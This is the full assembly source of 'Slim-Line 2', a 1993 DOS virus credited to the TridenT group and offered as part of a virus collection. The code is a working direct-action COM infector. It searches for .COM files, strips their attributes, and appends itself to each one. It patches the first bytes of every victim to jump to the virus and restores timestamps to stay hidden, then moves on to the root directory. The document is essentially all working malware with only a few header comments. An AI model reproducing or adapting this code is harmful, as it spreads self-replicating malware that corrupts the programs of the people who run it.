;
; The Slim-Line 2 virus, from the Slim-line virus collection.
; (C) 1993 by [D‡RkR‡Y]/TridenT
;
; And this time it's a direct action COM infector.
;  <will be commented soon>

_CODE   SEGMENT
        ASSUME  CS:_CODE, DS:_CODE, ES:_CODE
        ORG     100h

FIRST:
        DB      'D', 0E9h, 000h, 000h

VX:
        MOV     BP,00000h

        LEA     SI,[BP + OLD_4_BYTES]
        MOV     DI,00100h
        PUSH    DI
        MOV     CX,DI
        MOVSW
        MOVSW

        XOR     SI,SI
        LEA     DI,[BP + LAST + 2]
        PUSH    SI
        PUSH    DI
        PUSH    CX
        REP     MOVSB

FIND_FILE:
        MOV     AH,04Eh
        LEA     DX,[BP + FIND]
        MOV     CL,27h
AGAIN:
        INT     021h
        JC      GO_ROOT

YES_FILE:
        MOV     AX,04300h
        MOV     DX,09Eh
        INT     021h
        PUSH    CX

        MOV     AX,04301h
        XOR     CX,CX
        INT     021h

        MOV     AX,03D02h
        INT     021h
        XCHG    AX,BX


        MOV     AX,05700h
        INT     021h
        PUSH    CX
        PUSH    DX

        MOV     AH,03Fh
        MOV     CX,004h
        LEA     DX,[BP + OLD_4_BYTES]
        INT     021h

        MOV     SI,DX
        LODSW
        CMP     AX,0E944h
        JE      DONT_INFECT

        MOV     AL,02h
        CALL    SET_POINTER

        SUB     AX,00004h
        MOV     WORD PTR [BP + VX + 2],AX
        MOV     WORD PTR [BP + NEW_4_BYTES + 2],AX

        MOV     AH,040h
        MOV     CL,(LAST - VX)
        LEA     DX,[BP + VX]
        INT     021h

        XOR     AX,AX
        CALL    SET_POINTER

        MOV     AH,040h
        MOV     CL,004h
        LEA     DX,[BP + NEW_4_BYTES]
        INT     021h

DONT_INFECT:
        MOV     AX,05701h
        POP     DX
        POP     CX
        INT     021h

        MOV     AH,03Eh
        INT     021h

        MOV     AX,04301h
        POP     CX
        MOV     DX,09Eh
        INT     021h

        MOV     AH,4Fh
        JMP     AGAIN

GO_ROOT:

        MOV     AH,03Bh
        LEA     DX,[BP + ROOT]
        INT     021h
        JC      EXIT
        JMP     FIND_FILE

EXIT:
        POP     CX
        POP     SI
        POP     DI
        REP     MOVSB

        RET

SET_POINTER:
        MOV     AH,042h
        XOR     CX,CX
        CWD
        INT     021h
        RET

        OLD_4_BYTES:    NOP
                        NOP
                        NOP
                        RET

        FIND            DB      "*.COM", 000h
        ROOT            DB      "\", 000h

        CUT             DB      ""
        MARKER          DB      "[DR/TridenT]"
        NAMED           DB      "Slim-Line 2 v0.9·"
        COUNTRY         DB      "Holland"
        NEW_4_BYTES     DB      'D', 0E9h
LAST:

_CODE   ENDS
        END     FIRST
